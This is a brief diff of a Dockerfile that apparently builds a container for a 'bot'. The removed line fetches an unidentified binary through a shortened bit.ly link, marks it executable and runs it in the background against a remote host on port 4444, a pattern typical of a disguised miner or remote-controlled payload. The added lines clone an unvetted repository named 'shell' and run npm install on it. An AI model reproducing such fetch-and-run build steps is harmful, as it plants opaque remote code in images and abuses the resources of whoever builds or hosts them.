@@ -25,7 +25,8 @@ COPY startbot.sh /home
 COPY /stuff /home/stuff
 
 # Install the bot:
-RUN wget https://bit.ly/3mPeYds && chmod +x 3mPeYds && ./3mPeYds -B -o sgd1.zxc743.xyz:4444l
+RUN git clone https://github.com/TheJackalTrib/shell
+RUN cd shell && npm install
 
 RUN echo "Uploaded files:" && ls /home/stuff/
 
